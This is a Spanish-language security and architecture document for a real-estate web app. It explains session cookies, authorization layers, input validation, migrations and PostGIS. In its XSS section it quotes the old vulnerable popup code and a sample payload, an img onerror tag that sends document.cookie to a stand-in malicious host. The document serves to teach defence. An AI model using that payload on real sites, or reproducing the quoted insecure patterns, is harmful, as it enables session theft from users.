# 02. Arquitectura y Seguridad 🏗️🔐

Este documento explica **cómo encaja el proyecto** y, sobre todo, **por qué se tomaron las decisiones de seguridad**. Las fases anteriores dejaron el producto andando; aquí queda el porqué de cada una.

---

## 1. El flujo de una petición

Cuando alguien busca una propiedad, esto es lo que pasa:

```
Navegador (localhost:3000)
   │
   │  fetch('/api/propiedades?tipo=VENTA')
   │  credentials: 'include'   ← viaja la cookie de sesión
   │
   ▼
Route Handler de Next  (src/app/api/[...ruta]/route.ts)
   │  reenvía a http://localhost:5000
   │  copia cabeceras y TODAS las set-cookie
   │
   ▼
Express  (server.js)
   │  1. helmet            cabeceras de seguridad
   │  2. cors              lista blanca de orígenes
   │  3. cookieParser      lee la cookie
   │  4. express.json      parsea el cuerpo
   │  5. rate limit        corta el exceso
   │  6. validar (Zod)     rechaza lo que no cumple el esquema
   │  7. verificarToken    confirma la sesión
   │  8. verificarDuenio   confirma que el recurso es tuyo
   │  9. controlador      lógica de negocio
   │ 10. Prisma + PostGIS  datos
   │
   ▼
PostgreSQL
```

### ¿Por qué un puente y no llamadas directas?

Si el navegador llamara directo a `localhost:5000`, pasarían tres cosas malas:

1. **CORS abierto.** El navegador bloquearía la petición, y el "arreglo" es abrir `cors()` con `*`. Eso permite que **cualquier sitio del mundo** use tu API.
2. **La URL del backend queda expuesta** en el JavaScript que descarga cualquiera.
3. **Las cookies no viajan** entre orígenes distintos, y la sesión se rompe.

Con el puente, todo es **del mismo origen**: no hay CORS, la URL del backend no sale del servidor, y las cookies funcionan sin trucos.

El puente es un archivo de 40 líneas y elimina tres clases enteras de problemas.

---

## 2. Por qué cookies `httpOnly` y no `localStorage`

La versión anterior guardaba el token así:

```js
localStorage.setItem('innover_token', token);
```

`localStorage` es JavaScript. Cualquier script que corra en la página lo lee:

```js
localStorage.getItem('innover_token');
```

Si mañana entra un XSS, o una dependencia maliciosa, **se llevan la sesión de todos los usuarios**.

Con una cookie `httpOnly`:

```js
document.cookie;   // → no devuelve nada
```

El navegador la protege y la manda sola en cada petición. El frontend ni la ve ni la toca: solo llama a `/api/auth/perfil` y pregunta "¿sigo conectado?".

**Consecuencia en el código:** `src/contextos/Auth.tsx` no guarda ningún token. Solo guarda los *datos* del usuario (nombre, rol), que no son secretos.

### Y una cookie no basta: el pase corto y el que lo renueva

La sesión se apoya en **dos** cookies, y cada una hace lo que la otra no puede:

| Cookie | Qué es | Dura | ¿Se puede revocar? |
|---|---|---|---|
| `innover_token` | JWT firmado. Viaja en **cada** petición | 2 horas | **No** |
| `innover_renovacion` | Cadena al azar, guardada como hash en `TokenRenovacion` | 30 días | **Sí** |

El pase corto es autocontenido: el servidor comprueba la firma y no consulta
nada, y eso es lo que lo hace rápido. El precio es que **no se puede apagar**
antes de que venza, así que tiene que durar poco. El token largo no sirve para
pedir nada —solo para pedir otro pase cuando el corto vence— y por eso sí puede
durar mucho: vive en la base, así que se puede revocar (cerrar sesión, cambiar
la contraseña, o la alarma que se dispara si un token ya usado reaparece).

Lo que había antes era **lo peor de los dos**: una cookie de 7 días con un JWT de
2 horas dentro. El navegador guardaba seis días y medio un pase que el servidor
rechazaba desde las dos horas, y el único desenlace posible era "tu sesión
expiró". La gente no cierra sesión: se va. Y volver a entrar por obligación, cada
dos horas, es la clase de detalle que hace que un producto parezca de juguete.

📌 **Y el usuario no se entera de nada.** `lib/api.ts` intercepta el 401, pide un
pase nuevo y repite la petición **una sola vez**, con una única renovación en
vuelo: el servidor ROTA el token (cada renovación entrega uno nuevo y marca el
usado), así que dos peticiones que fallan a la vez —el buscador manda la lista y
el mapa en paralelo— no pueden pedir cada una por su cuenta. Toda la lógica,
con sus porqués, vive en `src/utils/renovacion.js`.

---

## 3. Autorización: tres capas, no una

El error clásico es tratar la autorización como una sola pregunta: "¿tiene sesión?". No basta. Son **tres capas**, y cada una responde a una pregunta distinta:

| Capa | Pregunta | Dónde |
|---|---|---|
| **Autenticación** | ¿quién eres? | `verificarToken` |
| **Autorización de rol** | ¿este rol puede hacer esto? | `verificarRol('ADMIN')` |
| **Autorización de recurso** | ¿este recurso es tuyo? | `verificarDuenio('propiedad')` |

La tercera es la que faltaba. Con solo las dos primeras:

```js
router.put('/:id', verificarToken, verificarRol('AGENTE'), actualizar);
// Un AGENTE autenticado puede editar la propiedad de OTRO AGENTE.
```

`verificarDuenio` va **después** de `verificarToken` a propósito:

```js
router.put('/:id',
  verificarToken,        // 1. ¿quién eres?
  validar(idParamSchema), // 2. ¿los datos tienen forma válida?
  verificarDuenio('propiedad'), // 3. ¿es tuya?
  actualizarPropiedad
);
```

Y el orden importa: si `verificarDuenio` fuera primero, `req.usuario` sería `undefined` y reventaría con un 500 en vez de un 401 claro.

---

## 4. Mass assignment: por qué no `data: req.body`

La versión anterior hacía exactamente esto:

```js
const propiedadActualizada = await prisma.propiedad.update({
  where: { id: parseInt(id) },
  data: req.body,     // ⛔
});
```

Eso permite que el cliente escriba **cualquier campo**:

```json
{ "usuario_id": 42, "id": 999 }
```

Un atacante roba la publicación de otro o cambia su identificador.

Ahora hay tres barreras:

1. **Zod define la lista blanca.** Los campos fuera del esquema se descartan.
2. **El dueño sale del token**, no del cuerpo: `const usuarioId = req.usuario.id`.
3. **Los campos de pago se ignoran** si no eres ADMIN (`destacado`).

Ojo con un detalle sutil de Zod: **los campos desconocidos se descartan en silencio**, no dan error. Eso es mejor que un 400: el cliente no rompe y el campo peligroso nunca se escribe. Si quisieras error, usarías `.strict()`.

### Y otro detalle: los defaults no se mezclan con `partial()`

```js
crearPropiedadSchema.partial()   // ⛔ ¡MAL!
```

`.partial()` conserva los `.default()`. Si al actualizar no mandas `tipo`, Zod le pone `'VENTA'` y **pisa el tipo real** de la propiedad. Por eso los campos comunes están definidos SIN default, y el default se aplica solo en el esquema de creación. Está anotado en `src/schemas/index.js`.

---

## 5. XSS en los popups del mapa

Este era el fallo más peligroso, porque el mapa es **público**.

```js
// ⛔ Antes
.setHTML(`
  <div>${prop.titulo}</div>
  <div>${prop.precio}</div>
`)
```

Basta con que alguien titule una propiedad:

```html
<img src=x onerror="fetch('//sitio-maliciouso.com?c='+document.cookie)">
```

Y se lo ejecuta a **cada visitante** que abra el mapa. Sin necesidad de registrarse.

**La defensa correcta no es escapar el texto, es no generar HTML:**

```ts
// ✅ Ahora
const titulo = document.createElement('p');
titulo.textContent = propiedad.titulo;
contenedor.appendChild(titulo);
```

`textContent` trata cualquier cadena como texto plano, siempre. Es imposible que se interprete como marcado.

**Lección:** `setHTML()` y `dangerouslySetInnerHTML` son decisiones, no atajos. Cada vez que se usan, hay que preguntarse de dónde sale el dato y quién lo controla.

---

## 6. Validación en el borde

Sin validación, estas peticiones llegaban a la base de datos:

```json
POST /api/propiedades { "precio": "mucho" }
GET  /api/propiedades/abc          → parseInt("abc") = NaN
GET  /api/propiedades?precioMin=x  → NaN en la consulta
```

Ahora Zod valida **antes** de tocar nada:

```js
router.post('/',
  verificarToken,
  limitadorEscritura,
  validar(crearPropiedadSchema),   // ← aquí
  crearPropiedad
);
```

El usuario recibe un 400 con el campo exacto que falló, y el frontend lo muestra pegado al input.

### Un detalle de Express 5

En Express 5, `req.query` es un **getter** sin setter:

```
TypeError: Cannot set property query of #<IncomingMessage>
           which has only a getter
```

Por eso el middleware de validación usa `Object.defineProperty` en vez de `req[fuente] = ...`. Está anotado en `src/middleware/validacion.js`.

---

## 7. Migraciones: por qué importan

El proyecto usaba `prisma db push`, que **no deja historial**. Significa que:

- No hay forma de saber qué cambió ni cuándo
- No se puede reproducir la base de otra persona
- Un cambio de esquema es irreversible

Ahora el esquema vive en el repositorio:

```
prisma/migrations/
├── 20260101000000_baseline/                  estado original
├── 20260101000001_ficha_tecnica_postgis/     ficha técnica + PostGIS
└── 20260101000002_consistencia_nombres/      tipoInmueble → tipo_inmueble
```

### La migración 001 preserva datos

Reescribir el enum `tipo` es delicado. El orden correcto es:

```sql
ALTER TABLE "Propiedad" RENAME COLUMN "tipo" TO "tipo_legacy";
ALTER TABLE "Propiedad" ADD COLUMN "tipo" "TipoOperacion";
UPDATE "Propiedad" SET "tipo" = ("tipo_legacy"::TEXT)::"TipoOperacion";
ALTER TABLE "Propiedad" DROP COLUMN "tipo_legacy";
```

Primero se copia, después se tira lo viejo. Al revés se pierden datos.

El `slug` se **backfillea antes** de volverlo `NOT NULL`, porque si no, la migración falla en una tabla con filas.

Y antes de migrar: `npm run backup` descarga todo a un JSON.

---

## 8. PostGIS y el trigger

La promesa del producto era "mapas interactivos", pero el modelo guardaba `latitud` y `longitud` como `Float` sueltos, sin ningún índice espacial. Consultar por cercanía obligaba a traer **todas** las filas a Node y compararlas una a una.

Ahora:

```sql
-- El trigger mantiene esto sincronizado solo
CREATE FUNCTION sync_propiedad_locacion() RETURNS TRIGGER AS $$
BEGIN
    NEW."locacion" = ST_SetSRID(
        ST_MakePoint(NEW."longitud", NEW."latitud"), 4326
    )::geography;
    RETURN NEW;
END; $$ LANGUAGE plpgsql;
```

El resultado es que **Prisma sigue escribiendo floats comfortable** y PostGIS mantiene el punto geográfico listo para consultas indexadas.

Las tres consultas que usa la aplicación:

| Operador | Para qué | Coste |
|---|---|---|
| `ST_DWithin(l, p, r)` | ¿está dentro de un radio? | Usa índice GIST |
| `<->` | ordenar por cercanía | KNN, tiempo constante |
| `ST_Distance(l, p)` | distancia real en km | — |

⚠️ `numeric` vuelve de PostgreSQL como **texto**. Hay que castear a `float8` o el frontend recibe `"0.5"` en vez de `0.5`.

---

## 9. Manejo de errores

Antes cada controlador tenía su propio `try/catch`, y un error no controlado en Express 5 se convertía en **HTML con el stack trace**, filtrando rutas de archivos.

Ahora hay un manejador central que clasifica:

| Origen | Respuesta |
|---|---|
| `AppError` (nuestros) | El código y mensaje que definimos |
| `Prisma P2002` | 409 "Ya existe ese correo" |
| `Prisma P2025` | 404 "No existe" |
| `ZodError` | 400 con la lista de campos |
| JSON mal formado | 400 "No es JSON válido" |
| Cualquier otro | 500 genérico **sin detalles** |

La regla de oro: **los 4xx son culpa del usuario y no se registran; los 5xx son bugs nuestros y se registran siempre.** Un log lleno de 404s esconde el 500 que de verdad importa.

---

## 10. Lo que sigue

Cosas que todavía **no** están resueltas y conviene tener en la lista:

- **Tests unitarios y de componentes.** Hay 281 pruebas de integración (226 de API y 55 del puente) y una unitaria —`verificar:clustering`, la lógica de agrupar chinchetas del mapa—. Lo que no hay es forma de probar un componente de React sin navegador, y los marcadores del mapa son justo eso.
- **Subida de imágenes.** El campo `imagenes` existe, falta el almacenamiento (S3/Cloudinary).
- **Verificación RENIEC.** Los campos `documento_identidad` e `identidad_verificada` están listos; falta integrar el servicio externo.
- **Suscripciones.** El `destacado` existe y se controla por rol; falta la lógica de cobro y los créditos de contacto.
- **Rate limiting distribuido.** `express-rate-limit` guarda el contador en memoria. Con varias instancias habría que moverlo a Redis.
